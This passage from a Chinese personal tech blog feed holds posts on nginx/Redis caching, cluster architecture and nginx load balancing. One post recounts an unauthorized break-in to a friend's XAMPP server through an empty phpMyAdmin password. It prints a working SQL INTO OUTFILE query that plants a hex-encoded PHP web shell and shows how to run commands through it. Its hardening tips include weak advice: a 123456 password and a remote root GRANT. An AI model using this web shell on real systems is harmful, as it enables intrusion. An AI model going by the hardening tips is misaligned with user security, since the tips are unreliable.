<p><br><hr><br></p>
<h4 id="本文出处-夏日小草-转载请注明出处：-http-homeway-me-2015-01-05-goodbye-2014-hello-2015"><a href="#本文出处-夏日小草-转载请注明出处：-http-homeway-me-2015-01-05-goodbye-2014-hello-2015" class="headerlink" title="本文出处  夏日小草, 转载请注明出处： http://homeway.me/2015/01/05/goodbye-2014-hello-2015/"></a>本文出处  <a href="http://homeway.me">夏日小草</a>, 转载请注明出处： <a href="http://homeway.me/2015/01/05/goodbye-2014-hello-2015/">http://homeway.me/2015/01/05/goodbye-2014-hello-2015/</a></h4><p><br></p>
<p>-By 小草</p>
<p>2015-01-05 02:10:05</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Mysql提权留后门]]></title>
      <url>http://homeway.me/2014/12/27/hack-mysql/</url>
      <content type="html"><![CDATA[<p><br></p>
<p><img src="https://static.blog.homeway.me/blog/logo-hack.jpg" alt="MYSQL提权留后门"></p>
<a id="more"></a>
<p><br></p>
<h4 id="记录一次关于无聊时对基友MYSQL服务器的提权攻击。"><a href="#记录一次关于无聊时对基友MYSQL服务器的提权攻击。" class="headerlink" title="记录一次关于无聊时对基友MYSQL服务器的提权攻击。"></a>记录一次关于无聊时对基友MYSQL服务器的提权攻击。</h4><h4 id="尽管没有完全攻击到对方，并且没有清理痕迹，但是，这里写写简单的防御方式。"><a href="#尽管没有完全攻击到对方，并且没有清理痕迹，但是，这里写写简单的防御方式。" class="headerlink" title="尽管没有完全攻击到对方，并且没有清理痕迹，但是，这里写写简单的防御方式。"></a>尽管没有完全攻击到对方，并且没有清理痕迹，但是，这里写写简单的防御方式。</h4><p><br></p>
<h1 id="0x01-从无聊的nmap扫描开始"><a href="#0x01-从无聊的nmap扫描开始" class="headerlink" title="0x01.从无聊的nmap扫描开始"></a>0x01.从无聊的nmap扫描开始</h1><p>今晚无聊时候，本想打开电脑扫下谁连进我wifi，无意间，眼睛一亮看到了一个惊喜。</p>
<p><br></p>
<center><img src="/image/2014-12-27-hack-mysql-1.png" style="width:50%;" alt="nmap扫描结果"></center>

<p><br></p>
<p>看到80端口，就有种冲动想要进去，进去后发现forbidden，然后试了试 phpmyadmin,发现直接进去，因为基友用的XAMPP集成环境，一下就猜到空密码。</p>
<p><br></p>
<center><img src="/image/2014-12-27-hack-mysql-2.png" style="width:80%;" alt="进入到phpmyadmin"></center>

<p><br></p>
<p>登进去后，就想办法留个后门，搞个木马。注意一下，mysql是以管理员权限运行的，so…</p>
<p>查了下资料，这个很简单，网上很多。</p>
<p>找个一个表进去,用下面那句话，就搞定了。 </p>
<p><code>SELECT 0x3C3F7068702073797374656D28245F524551554553545B636D645D293B3F3E FROM user into outfile &#39;/Applications/XAMPP/xamppfiles/phpmyadmin/fuck.php&#39;</code></p>
<p>那一串字符就是 <code>&lt;?php system($_REQUEST[cmd]);?&gt;</code> 的十六进制编码了，只要路径对，就ok了。</p>
<p>进去以后，只要访问 <code>/phpmyadmin/fuck.php?cmd=</code> 就能直接打terminal命令了。</p>
<p><br></p>
<center><img src="/image/2014-12-27-hack-mysql-3.jpg" style="width:80%;" alt="直接打terminal命令的结果"></center>

<p><br></p>
<p>可以看到我输入<code>ls /</code>输出了跟目录下面的文件和文件夹。</p>
<p>这个时候，如果是win党，来个中国菜刀！！！啊啊啊，条子！！带走！！！</p>
<p><br><hr><br></p>
<h1 id="0x02-关于Xampp安全-MAC环境"><a href="#0x02-关于Xampp安全-MAC环境" class="headerlink" title="0x02.关于Xampp安全(MAC环境)"></a>0x02.关于Xampp安全(MAC环境)</h1><p>下面说下个人经历，关于MAC下，xampp环境的安全处理。</p>
<h3 id="A-关闭phpmyadmin远程登录"><a href="#A-关闭phpmyadmin远程登录" class="headerlink" title="A.关闭phpmyadmin远程登录"></a>A.关闭phpmyadmin远程登录</h3><blockquote>
<p>vim /Applications/XAMPP/xamppfiles/etc/extra/http-xmapp.conf</p>
</blockquote>
<p>在最底下添加访问权限，以及关闭修改权限。</p>
<pre><code>&lt;LocationMatch &quot;^/(?i:(?:xampp|security|licenses|phpmyadmin|webalizer|server-status|server-info))&quot;&gt;
    Require local
    ErrorDocument 403 /error/XAMPP_FORBIDDEN.html.var
&lt;/LocationMatch&gt;
</code></pre><p><br></p>
<h3 id="B-关闭Http远程访问权限"><a href="#B-关闭Http远程访问权限" class="headerlink" title="B.关闭Http远程访问权限"></a>B.关闭Http远程访问权限</h3><blockquote>
<p>vim /Applications/XAMPP/xamppfiles/apache2/conf/httpd.conf</p>
</blockquote>
<pre><code>&lt;Directory &quot;/Applications/XAMPP/xamppfiles/apache2/htdocs&quot;&gt;
    Options Indexes FollowSymLinks
    AllowOverride All
    Order allow,deny
    Deny from all #拒绝远程访问
&lt;/Directory&gt;
</code></pre><p><br></p>
<h3 id="C-关于Mysql文件写入权限"><a href="#C-关于Mysql文件写入权限" class="headerlink" title="C.关于Mysql文件写入权限"></a>C.关于Mysql文件写入权限</h3><p>这里不是所有都能写入的，只要关闭了用户写入权限，就不能写入木马了。这个时候，就需要对xampp配置做处理下。</p>
<p>这是我本地测试：</p>
<p><br></p>
<center><img src="/image/2014-12-27-hack-mysql-4.png" alt="mysql写入权限"></center>

<p><br></p>
<p>关闭mysql写入文件权限（我本地的）：</p>
<blockquote>
<p>vim /Applications/XAMPP/xamppfiles/etc/extra/http-xmapp.conf</p>
</blockquote>
<pre><code># since XAMPP 1.4.3
&lt;Directory &quot;/Applications/XAMPP/xamppfiles/phpmyadmin&quot;&gt;
    AllowOverride AuthConfig Limit
    Require all granted
&lt;/Directory&gt;
</code></pre><p>不管怎么样，反正记得，创建的文件夹，非不得已，不要 chmod 777，特别是upload等目录，注意防范。</p>
<p><br></p>
<h3 id="D-修改Mysql密码"><a href="#D-修改Mysql密码" class="headerlink" title="D.修改Mysql密码"></a>D.修改Mysql密码</h3><p>1、进入到phpmyadmin后，直接执行SQL语句：</p>
<pre><code>update user set password=password(&#39;123456&#39;) where User=&#39;root&#39;

GRANT ALL PRIVILEGES ON *.* TO &#39;root&#39;@&#39;%&#39; IDENTIFIED BY &#39;123456&#39; WITH GRANT OPTION;
</code></pre><p>2、直接修改</p>
<blockquote>
<p>vim /Applications/XAMPP/xamppfiles/etc/my.conf</p>
</blockquote>
<p>找到19行:</p>
<p><code>password    = your_password</code></p>
<p><br><hr><br></p>
<h1 id="0x03-关于xmapp的一些环境"><a href="#0x03-关于xmapp的一些环境" class="headerlink" title="0x03.关于xmapp的一些环境"></a>0x03.关于xmapp的一些环境</h1><h3 id="1、端口占用问题（最常见的）"><a href="#1、端口占用问题（最常见的）" class="headerlink" title="1、端口占用问题（最常见的）"></a>1、端口占用问题（最常见的）</h3><h4 id="Http-80端口configure在："><a href="#Http-80端口configure在：" class="headerlink" title="Http 80端口configure在："></a>Http 80端口configure在：</h4><p><code>/Applications/XAMPP/xamppfiles/etc/httpd.conf</code></p>
<p>52行：</p>
<h4 id="Mysql-3306端口configure在："><a href="#Mysql-3306端口configure在：" class="headerlink" title="Mysql 3306端口configure在："></a>Mysql 3306端口configure在：</h4><p><code>/Applications/XAMPP/xamppfiles/etc/my.conf</code></p>
<p>20行</p>
<h3 id="2、添加vhost"><a href="#2、添加vhost" class="headerlink" title="2、添加vhost"></a>2、添加vhost</h3><p><code>/Applications/XAMPP/xamppfiles/etc/extra/http-vhost.conf</code></p>
<h3 id="3、配置Mysql缓存大小"><a href="#3、配置Mysql缓存大小" class="headerlink" title="3、配置Mysql缓存大小"></a>3、配置Mysql缓存大小</h3><p>大多数的MySQL服务器都开启了查询缓存。这是提高性最有效的方法之一，而且这是被MySQL的数据库引擎处理的。当有很多相同的查询被执行了多次的时候，这些查询结果会被放到一个缓存中，这样，后续的相同的查询就不用操作表而直接访问缓存结果了。</p>
<p><code>/Applications/XAMPP/xamppfiles/etc/httpd.conf</code></p>
<p>最后面：</p>
<pre><code>[isamchk]
key_buffer = 20M
sort_buffer_size = 20M
read_buffer = 2M
write_buffer = 2M
</code></pre><p><br><hr><br></p>
<h4 id="本文出自-夏日小草-转载请注明出处-http-homeway-me-2014-12-27-hack-mysql"><a href="#本文出自-夏日小草-转载请注明出处-http-homeway-me-2014-12-27-hack-mysql" class="headerlink" title="本文出自 夏日小草,转载请注明出处:http://homeway.me/2014/12/27/hack-mysql/"></a>本文出自 <a href="http://homeway.me">夏日小草</a>,转载请注明出处:<a href="http://homeway.me/2014/12/27/hack-mysql/">http://homeway.me/2014/12/27/hack-mysql/</a></h4><p><br></p>
<p>-by小草</p>
<p>2014-12-27 02:46:38</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[基于Redis+Srcache_nginx服务器缓存]]></title>
      <url>http://homeway.me/2014/12/25/nginx-redis-srcache-cache/</url>
      <content type="html"><![CDATA[<p><br></p>
<p><img src="https://static.blog.homeway.me/blog/logo-nginx.png" alt="nginx-reverse-proxy-conf"></p>
<a id="more"></a>
<p><br></p>
<h4 id="关于篇文章，是对之前-《分布式服务器集群架构方案思考》-的关于cache实践"><a href="#关于篇文章，是对之前-《分布式服务器集群架构方案思考》-的关于cache实践" class="headerlink" title="关于篇文章，是对之前 《分布式服务器集群架构方案思考》 的关于cache实践"></a>关于篇文章，是对之前 <a href="http://homeway.me/2014/12/10/think-about-distributed-clusters/">《分布式服务器集群架构方案思考》</a> 的关于cache实践</h4><h4 id="主要实现了基于redis和srcache-nginx服务器缓存（基于LNMP环境）"><a href="#主要实现了基于redis和srcache-nginx服务器缓存（基于LNMP环境）" class="headerlink" title="主要实现了基于redis和srcache_nginx服务器缓存（基于LNMP环境）"></a>主要实现了基于redis和srcache_nginx服务器缓存（基于LNMP环境）</h4><p><br></p>
<h1 id="0x01-Web缓存的类型"><a href="#0x01-Web缓存的类型" class="headerlink" title="0x01.Web缓存的类型"></a>0x01.Web缓存的类型</h1><p>在Web应用领域，Web缓存大致可以分为以下几种类型：</p>
<h4 id="数据库数据缓存："><a href="#数据库数据缓存：" class="headerlink" title="数据库数据缓存："></a>数据库数据缓存：</h4><p>在大型网站下，会频繁地处理数据库信息，导致数据库压力增加，为了提供查询的性能，会将查询后的数据放到内存中进行缓存，下次查询时，直接从内存缓存直接返回，提供响应效率。比如常用的缓存方案有memcached等。  </p>
<p><br></p>
<h4 id="服务器端缓存："><a href="#服务器端缓存：" class="headerlink" title="服务器端缓存："></a>服务器端缓存：</h4><h5 id="A-代理服务器缓存："><a href="#A-代理服务器缓存：" class="headerlink" title="A.代理服务器缓存："></a>A.代理服务器缓存：</h5><p>关于服务器缓存，有很多种方式，常用的代理缓存有varnish和squid。</p>
<p>后来用的多的是varnish，Varnish是一款高性能的开源HTTP加速器，挪威最大的在线报纸Verdens Gang使用3台Varnish代替了原来的12台Squid，性能比以前更好。</p>
<p>关于varnish，可以看我之前搭建过的教程 <a href="http://homeway.me/2014/08/10/%E8%BF%90%E7%BB%B4-varnish%E7%BC%93%E5%AD%98/">《varnish缓存》</a></p>
<p>为了提前预备足够的承受能力，我这里下选择redis处理服务器缓存。</p>
<p>redis有很多优点适合当前环境：</p>
<ul>
<li><p>支持分布式redis拓展，当网站压力过大，一台redis支撑不住时候，可以增加分布式redis。</p>
</li>
<li><p>键值存储数据，轻巧高效。redis被成为服务器开发的瑞士军刀，就是因为轻，快著名。</p>
</li>
</ul>
<h5 id="B-CDN缓存："><a href="#B-CDN缓存：" class="headerlink" title="B.CDN缓存："></a>B.CDN缓存：</h5><p>CDN（Content delivery networks）缓存，也叫网关缓存、反向代理缓存。CDN缓存一般是由网站管理员自己部署，为了让他们的网站更容易扩展并获得更好的性能。</p>
<p><br></p>
<h4 id="Web应用层缓存"><a href="#Web应用层缓存" class="headerlink" title="Web应用层缓存"></a>Web应用层缓存</h4><p>主要在应用层逻辑添加缓存，关于这个已经集成在Jue的后台框架了，并且已经做过测试，<a href="http://homeway.me/2014/09/05/code-performance-php/">《代码性能-php》</a>。</p>
<p>主要通过代码逻辑和缓存策略，实现对数据，页面，图片等资源的缓存，可以根据实际情况选择将数据存在文件系统或者内存中，减少数据库查询或者读写瓶颈，提高响应效率。</p>
<p><br></p>
<h4 id="浏览器端缓存"><a href="#浏览器端缓存" class="headerlink" title="浏览器端缓存"></a>浏览器端缓存</h4><p>浏览器缓存根据一套与服务器约定的规则进行工作，在同一个会话过程中会检查一次并确定缓存的副本足够新。这个部分主要由浏览器处理。</p>
<p>Nginx本身就自带缓存处理，我们可以直接在server里面对静态文件做过期处理，实现静态文件的缓存。</p>
<p><br><hr><br></p>
<h1 id="0x02-安装与配置"><a href="#0x02-安装与配置" class="headerlink" title="0x02.安装与配置"></a>0x02.安装与配置</h1><h4 id="A-Nginx编译安装"><a href="#A-Nginx编译安装" class="headerlink" title="A.Nginx编译安装"></a>A.Nginx编译安装</h4><p>我用的是lnmp环境做开发，所以，在运行完lnmp安装后，要重新编译安装nginx，添加我们想要的模块。</p>
<p>先进去/lnmp-full/nginx/ 目录，编辑下nginx的配置，重新编译安装下nginx：</p>
<blockquote>
<p>cd lnmp1.1-full/nginx-1.6.0/</p>
<p>vim install.sh</p>
</blockquote>
<p>天加下面的东西</p>
<pre><code>./configure --user=www --group=www --prefix=/usr/local/nginx 
--add-module=/path/to/ngx_devel_kit-master 
--add-module=/path/to/set-misc-nginx-module
--add-module=/path/to/srcache-nginx-module 
--add-module=/path/to/lua-nginx-module 
--add-module=/path/to/lua-resty-redis 
--add-module=/path/to/redis2-nginx-module
--add-module=/path/to/echo-nginx-module  
--with-ipv6

make &amp;&amp; make install
</code></pre><p><br></p>
<p>这里我只显示几个必须安装的模块，具体包要自行下载，指明路径。</p>
<p><a href="https://github.com/openresty/set-misc-nginx-module" target="_blank" rel="external">set-misc-nginx</a> 是一个处理各个加密算法的包，在这里主要处理key的hash加密。</p>
<p><a href="https://github.com/openresty/srcache-nginx-module" target="_blank" rel="external">srcache-nginx</a></p>
<p><br></p>
<p>B.关于Lua</p>
<p>这里需要安装队lua的依赖，关于lua的安装，这里不说了。</p>
<p><br></p>
<p>C.关于Redis</p>
<p>安装redis，只要在官网下载个包，直接跑就可以了。</p>
<p>下面是redis配置文件。</p>
<blockquote>
<p>vim /path/to/redis.conf</p>
</blockquote>
<pre><code>daemonize yes
pidfile /var/run/redis-6379.pid
port 6379
bind 127.0.0.1
timeout 0
tcp-keepalive 0
loglevel notice
logfile stdout
databases 16
stop-writes-on-bgsave-error yes
rdbcompression yes
rdbchecksum yes
dbfilename dump.rdb
slave-serve-stale-data yes
slave-read-only yes
repl-disable-tcp-nodelay no
slave-priority 100
maxmemory 8096mb    
maxmemory-policy volatile-ttl
appendonly no
appendfsync everysec
no-appendfsync-on-rewrite no
auto-aof-rewrite-percentage 100
auto-aof-rewrite-min-size 64mb
lua-time-limit 5000
slowlog-log-slower-than 10000
slowlog-max-len 128
hash-max-ziplist-entries 512
hash-max-ziplist-value 64
list-max-ziplist-entries 512
list-max-ziplist-value 64
set-max-intset-entries 512
zset-max-ziplist-entries 128
zset-max-ziplist-value 64
activerehashing yes
client-output-buffer-limit normal 0 0 0
client-output-buffer-limit slave 256mb 64mb 60
client-output-buffer-limit pubsub 32mb 8mb 60
hz 10
aof-rewrite-incremental-fsync yes
</code></pre><p><br></p>
<p>D.关于nginx配置</p>
<p>在http里面添加</p>
<pre><code>http{    
    upstream redis {
            server 127.0.0.1:6379;
                keepalive 512;
    }
}
</code></pre><p>在server里面添加：</p>
<pre><code>server{
    location = /redis_get {
            internal;
            set_md5 $redis_key $args;
            redis_pass redis;
    }

    location = /redis_set {
            internal;

            set_unescape_uri $exptime $arg_exptime;    //过期时间更新
            set_unescape_uri $key $arg_key;            //提取缓存
            set_md5 $key;

            redis2_query set $key $echo_request_body;  //添加缓存
            redis2_query expire $key $exptime;         //过期处理
            redis2_pass redis;
    }

    //这里是要做缓存的位置
    location ~ [^/]\.php(/|$) {
            set $key $request_uri;
            set_escape_uri $escaped_key $key;
            srcache_fetch GET /redis_get $key;          //获取缓存信息
            srcache_default_expire 1;                   //过期处理
            srcache_store PUT /redis_set key=$escaped_key&amp;exptime=$srcache_expire;
            try_files $uri =404;
            fastcgi_pass  unix:/tmp/php-cgi.sock;
            fastcgi_index index.php;
            include fastcgi.conf;
            access_log /home/wwwlogs/redis-cache.log access;
        }

}
</code></pre><p>一样的，这里只是把主要的东西写进来了，其他东西记得添加进去。</p>
<p><br><hr><br></p>
<h1 id="0x03-测试结果"><a href="#0x03-测试结果" class="headerlink" title="0x03.测试结果"></a>0x03.测试结果</h1><h4 id="没有做缓存状态："><a href="#没有做缓存状态：" class="headerlink" title="没有做缓存状态："></a>没有做缓存状态：</h4><p><img src="/image/2014-12-25-nginx-redis-srcache-cache-1.jpg" alt="没有做缓存状态："></p>
<h4 id="做缓存状态："><a href="#做缓存状态：" class="headerlink" title="做缓存状态："></a>做缓存状态：</h4><p><img src="/image/2014-12-25-nginx-redis-srcache-cache-2.jpg" alt="做缓存状态："></p>
<p><br><hr><br></p>
<h4 id="本文出自-夏日小草-转载请注明出处-http-homeway-me-2014-12-25-nginx-redis-srcache-cache"><a href="#本文出自-夏日小草-转载请注明出处-http-homeway-me-2014-12-25-nginx-redis-srcache-cache" class="headerlink" title="本文出自 夏日小草,转载请注明出处:http://homeway.me/2014/12/25/nginx-redis-srcache-cache/"></a>本文出自 <a href="http://homeway.me">夏日小草</a>,转载请注明出处:<a href="http://homeway.me/2014/12/25/nginx-redis-srcache-cache/">http://homeway.me/2014/12/25/nginx-redis-srcache-cache/</a></h4><p><br></p>
<p>-by小草</p>
<p>2014-12-25 00:55:51</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[分布式服务器集群架构方案思考]]></title>
      <url>http://homeway.me/2014/12/10/think-about-distributed-clusters/</url>
      <content type="html"><![CDATA[<p><br></p>
<p><img src="https://static.blog.homeway.me/blog/logo-big-data-cloud.jpg" alt="nginx-reverse-proxy-conf"></p>
<a id="more"></a>
<p><br></p>
<h4 id="研究了一套完整的分布式服务器集群架构方案。"><a href="#研究了一套完整的分布式服务器集群架构方案。" class="headerlink" title="研究了一套完整的分布式服务器集群架构方案。"></a>研究了一套完整的分布式服务器集群架构方案。</h4><p>#### </p>
<p><br><hr><br></p>
<h1 id="0x01-大型网站演化"><a href="#0x01-大型网站演化" class="headerlink" title="0x01.大型网站演化"></a>0x01.大型网站演化</h1><p>简单说，分布式是以缩短单个任务的执行时间来提升效率的，而集群则是通过提高单位时间内执行的任务数来提升效率。</p>
<p>集群主要分为：高可用集群(High Availability Cluster)，负载均衡集群(Load Balance Cluster，nginx即可实现)，科学计算集群(High Performance Computing Cluster)。</p>
<p>分布式是指将不同的业务分布在不同的地方；而集群指的是将几台服务器集中在一起，实现同一业务。分布式中的每一个节点，都可以做集群。 而集群并不一定就是分布式的。 </p>
<p>之前在网上看到一篇关于大型网站演化的博客。<a href="http://www.cnblogs.com/leefreeman/p/3993449.html" target="_blank" rel="external">http://www.cnblogs.com/leefreeman/p/3993449.html</a></p>
<p>每个大型网站都会有不同的架构模式，而架构内容也就是在处理均衡负载，缓存，数据库，文件系统等，只是在不同的环境下，不同的条件下，架构的模型不一样，目的旨在提高网站的性能。</p>
<p>最初的架构只有应用程序，数据库，文件服务。</p>
<p><img src="/image/2014-12-10-big-website-framwork-1.jpg" alt="应用程序、数据库、文件服务架构"></p>
<p><br></p>
<p>到后来，分布式服务、集群架设。</p>
<p><img src="/image/2014-12-10-big-website-framwork-10.jpg" alt="分布式服务器集群"></p>
<p><br><hr><br></p>
<h1 id="0x02-关于均衡负载方案"><a href="#0x02-关于均衡负载方案" class="headerlink" title="0x02.关于均衡负载方案"></a>0x02.关于均衡负载方案</h1><p>在上一篇，<a href="http://homeway.me/2014/12/05/nginx-reverse-proxy-to-load-balance/">《Nginx反向代理实现均衡负载》</a>讨论过过的nginx现实均衡负载方案，这里选择另一种HAProxy+Keepalived双机高可用均衡负载方案。</p>
<p>HAProxy是免费、极速且可靠的用于为TCP和基于HTTP应用程序提供高可用、负载均衡和代理服务的解决方案，尤其适用于高负载且需要持久连接或7层处理机制的web站点。</p>
<p>不论是Haproxy还是Keepalived甚至是上游服务器均提高生产力并增强可用性,也就是如下架构中Haproxy,Keepalived,Httpd服务器任意宕机一台服务还是可以正常运行的。</p>
<p>HAProxy的优点：</p>
<p>1、HAProxy是支持虚拟主机的，可以工作在4、7层(支持多网段)；</p>
<p>2、能够补充Nginx的一些缺点比如Session的保持，Cookie的引导等工作；</p>
<p>3、支持url检测后端的服务器；</p>
<p>4、本身仅仅就只是一款负载均衡软件；单纯从效率上来讲HAProxy更会比Nginx有更出色的负载均衡速度，在并发处理上也是优于Nginx的；</p>
<p>5、HAProxy可以对Mysql读进行负载均衡，对后端的MySQL节点进行检测和负载均衡；</p>
<p><img src="/image/2014-12-10-keepalive-haproxy.jpg" alt="HAProxy+Keepalive 均衡负载方案"></p>
<p><br><hr><br></p>
<h1 id="0x03-关于Redis缓存方案"><a href="#0x03-关于Redis缓存方案" class="headerlink" title="0x03.关于Redis缓存方案"></a>0x03.关于Redis缓存方案</h1><p>缓存分为服务器缓存和应用程序缓存。</p>
<p>关于应用程序内缓存，已经在<a href="https://github.com/grasses/Jue-MVC" target="_blank" rel="external">Jue后台框架</a>里面做了模块处理了。</p>
<p>关于服务器缓存，主要缓存服务器文件，减少服务器和php交互，减少均衡负载服务器和应用程序服务器交互。</p>
<p>缓存里面有一种典型的memcached，现在用的多的是redis轻量级缓存方案。</p>
<p>关于memcached与redis，看这篇 <a href="http://www.bigdatalittlegeek.com/blog/2014/3/25/memcached-vs-redis" target="_blank" rel="external">《Memcached vs Redis?》</a></p>
<p>Redis主要将数据存储在各种格式：列表，数组，集合和排序集，一次能接受多个命令，阻塞读写，等待直到另一个进程将数据写入高速缓存。</p>
<p><img src="/image/2014-12-10-redis-cache.jpg" alt="Redis Cache 方案"></p>
<p><br></p>
<p>一篇关于Reids缓存方案。<a href="http://www.infoq.com/cn/news/2014/11/open-source-redis-cache" target="_blank" rel="external">《高可用、开源的Redis缓存集群方案》</a></p>
<p><br><hr><br></p>
<h1 id="0x04-关于搜索引擎Sphinx方案"><a href="#0x04-关于搜索引擎Sphinx方案" class="headerlink" title="0x04.关于搜索引擎Sphinx方案"></a>0x04.关于搜索引擎Sphinx方案</h1><p>(第一期不做，后期需求时候考虑)<em>**</em></p>
<p>Sphinx是俄罗斯人开发的，号称是很吊啦，千万级数据检索，每秒10MB/s，搭过环境。</p>
<p>Sphinx和MySQL是基于数据库的全文引擎，创建索引是B+树和hash key-value的方式。</p>
<p>原理类似于用底层C检索MySQL，然后弄出一个sphinx.conf配置文件，索引与搜索均以这个文件为依据进行，要进行全文检索，首先就要配置好sphinx.conf，告诉sphinx哪些字段需要进行索引，哪些字段需要在where,orderby,groupby中用到。</p>
<p><a href="http://sphinxsearch.com/wiki/doku.php?id=sphinx_chinese_tutorial" target="_blank" rel="external">Sphinx中文</a></p>
<p><br><hr><br></p>
<h1 id="0x05-关于NoSQL快速存储方案"><a href="#0x05-关于NoSQL快速存储方案" class="headerlink" title="0x05.关于NoSQL快速存储方案"></a>0x05.关于NoSQL快速存储方案</h1><p>NoSQL在这里的使用价值是处理一些琐事，比如用户个人网站的一些css值，height,width,color等等的小而繁多的数据，采用NoSQL旨在提升数据库速度，减少对MySQL的SELECT请求。</p>
<p>关于NoSQL的方案很多了，选一个简单的MongDB好了。</p>
<p><br><hr><br></p>
<h1 id="0x06-关于分布式MySQL方案"><a href="#0x06-关于分布式MySQL方案" class="headerlink" title="0x06.关于分布式MySQL方案"></a>0x06.关于分布式MySQL方案</h1><p>(做分布式MySQL还没尝试过，初期也不清楚mysql所需要的压力，所以第一期不打算做分布式MySQL)</p>
<p><a href="http://www.infoq.com/cn/news/2014/11/mysql-five-open-source-project" target="_blank" rel="external">《标准MySQL数据库外的5个开源兼容方案》</a></p>
<p><br><hr><br></p>
<h1 id="0x07-分布式集群方案"><a href="#0x07-分布式集群方案" class="headerlink" title="0x07.分布式集群方案"></a>0x07.分布式集群方案</h1><p>综合起来，大致就是如下模型，初探分布式架构，还有很多要修改的，待续，时时更新中。。。</p>
<p><img src="/image/2014-12-10-big-website-framwork-design.png" alt="一个网站架构"></p>
<p><br><hr><br></p>
<h5 id="本文出自-夏日小草-转载请注明出处-http-homeway-me-2014-12-10-think-about-distributed-clusters"><a href="#本文出自-夏日小草-转载请注明出处-http-homeway-me-2014-12-10-think-about-distributed-clusters" class="headerlink" title="本文出自 夏日小草,转载请注明出处:http://homeway.me/2014/12/10/think-about-distributed-clusters/"></a>本文出自 <a href="http://homeway.me">夏日小草</a>,转载请注明出处:<a href="http://homeway.me/2014/12/10/think-about-distributed-clusters/">http://homeway.me/2014/12/10/think-about-distributed-clusters/</a></h5><p><br></p>
<p>-by小草</p>
<p>2014-12-10 23:27:01</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Nginx反向代理实现均衡负载]]></title>
      <url>http://homeway.me/2014/12/05/nginx-reverse-proxy-to-load-balance/</url>
      <content type="html"><![CDATA[<p><br></p>
<p><img src="https://static.blog.homeway.me/blog/logo-nginx.png" alt="nginx-reverse-proxy-conf"></p>
<a id="more"></a>
<p><br></p>
<h4 id="为jue-so架设一个服务器集群。"><a href="#为jue-so架设一个服务器集群。" class="headerlink" title="为jue.so架设一个服务器集群。"></a>为jue.so架设一个服务器集群。</h4><h4 id="架设服务器均衡负载方式有多种，Nginx、LVS、HAProxy-Keepalived是目前使用最广泛的三种方案"><a href="#架设服务器均衡负载方式有多种，Nginx、LVS、HAProxy-Keepalived是目前使用最广泛的三种方案" class="headerlink" title="架设服务器均衡负载方式有多种，Nginx、LVS、HAProxy+Keepalived是目前使用最广泛的三种方案"></a>架设服务器均衡负载方式有多种，Nginx、LVS、HAProxy+Keepalived是目前使用最广泛的三种方案</h4><p><br></p>
<h1 id="0x01-关于均衡负载"><a href="#0x01-关于均衡负载" class="headerlink" title="0x01. 关于均衡负载"></a>0x01. 关于均衡负载</h1><p>架设服务器均衡负载方式有多种，Nginx、LVS、HAProxy+Keepalived是目前使用最广泛的三种方案。</p>
<p>其中Keepalived+HAProxy是一个高可用性方案。</p>
<p>关于3者比较，可以看这篇博客<a href="http://www.rootop.org/pages/2773.html" target="_blank" rel="external">http://www.rootop.org/pages/2773.html</a></p>
<p>工作在网络的7层之上，可以针对http应用做一些分流的策略。</p>
<p><br><hr><br></p>
<h1 id="0x02-关于Nginx"><a href="#0x02-关于Nginx" class="headerlink" title="0x02.关于Nginx"></a>0x02.关于Nginx</h1><p>nginx在启动后，在unix系统中会以daemon的方式在后台运行，后台进程包含一个master进程和多个worker进程。</p>
<p>master进程主要用来管理worker进程，包含：接收来自外界的信号，向各worker进程发送信号，监控worker进程的运行状态，当worker进程退出后(异常情况下)，会自动重新启动新的worker进程。</p>
<p>而基本的网络事件，则是放在worker进程中来处理了。</p>
<p>多个worker进程之间是对等的，他们同等竞争来自客户端的请求，各进程互相之间是独立的。</p>
<p>关于nginx，主要由3大模块，内核模块，事件模块，http核心模块。</p>
<p>nginx模块一般被分成三大类：handler、filter和upstream。</p>
<p><img src="/image/2014-12-04-nginx-work.png" alt="nginx工作模型"></p>
<p><br><hr><br></p>
<h1 id="0x03-服务器集群环境"><a href="#0x03-服务器集群环境" class="headerlink" title="0x03.服务器集群环境"></a>0x03.服务器集群环境</h1><p>接下来讲下想要搭的均衡负载环境。</p>
<p><img src="/image/2014-12-04-nginx-load-balance.jpg" alt="Nginx服务器集群"></p>
<pre><code>系统环境 : Linux Centos 7 aws 2.6.32-504.1.3.el6.x86_64 
Nginx Version:1.6.0

均衡负载服务器： 172.31.19.122:80(lnmp一键安装)
WEB1: 172.31.15.59:80
WEB2: 172.31.15.94:80
WEB3: 172.31.15.24:80
</code></pre><p><br><hr><br></p>
<h1 id="0x04-负载Nginx配置"><a href="#0x04-负载Nginx配置" class="headerlink" title="0x04.负载Nginx配置"></a>0x04.负载Nginx配置</h1><p>服务器用lnmp一键安装，自带的conf配置已经配置好一切了。</p>
<p>下面是完整的配置文件。</p>
<blockquote>
<p>/usr/local/nginx/conf/nginx.conf</p>
</blockquote>
<p><br></p>
<pre><code>user  www www;
worker_processes auto;
error_log  /home/wwwlogs/nginx_error.log  crit;
pid        /usr/local/nginx/logs/nginx.pid;
worker_rlimit_nofile 51200;

events {
    use epoll;
    worker_connections 51200;
    multi_accept on;
}

http {
    include       mime.types;
    default_type  application/octet-stream;#处理接收的数据类型

    server_names_hash_bucket_size 128;
    client_header_buffer_size 32k;
    large_client_header_buffers 4 32k;
    client_max_body_size 50m;

    sendfile on;
    tcp_nopush     on;

    keepalive_timeout 60;
    tcp_nodelay on;
    fastcgi_connect_timeout 300;
    fastcgi_send_timeout 300;
    fastcgi_read_timeout 300;
    fastcgi_buffer_size 64k;
    fastcgi_buffers 4 64k;
    fastcgi_busy_buffers_size 128k;
    fastcgi_temp_file_write_size 256k;
    # 添加gzip压缩
    gzip on;
    gzip_min_length  1k;
    gzip_buffers     4 16k;
    gzip_http_version 1.0;
    gzip_comp_level 2;
    gzip_types       text/plain application/x-javascript text/css application/xml;
    gzip_vary on;
    gzip_proxied        expired no-cache no-store private auth;
    gzip_disable        &quot;MSIE [1-6]\.&quot;;

    server_tokens off;

    # 通过upstream处理均衡负载
    upstream static.homeway {
        server 172.31.15.24:80;
    }
    upstream homeway {
        # ip hash主要是对ip处理下，让下次访问时候，还是访问当前服务器，这样就不会导致session丢失
        ip_hash;
        # weight权重，配置访问概率
        server 172.31.15.59:80 weight=10;
        server 172.31.15.94:80 weight=5;
    }

    server {

        listen 80 default;
        server_name 172.31.19.122;
        index index.html index.htm index.php;

        #error_page   404   /404.html;

        location ~ .*\.(js|css)?$ {
            expires      12h;
        }

